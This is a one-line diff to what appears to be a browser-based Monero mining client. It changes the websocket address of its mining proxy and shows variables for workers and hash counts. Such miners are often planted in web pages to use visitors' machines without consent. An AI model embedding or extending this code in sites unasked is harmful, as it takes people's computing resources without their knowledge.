@@ -1,4 +1,4 @@
-var server = "wss://proxy-xmr.onrender.com"; 
+var server = "wss://proxy-xmr.onrender.com:10000"; 
 var ws = null;
 var workers = [];
 var totalhashes = 0;
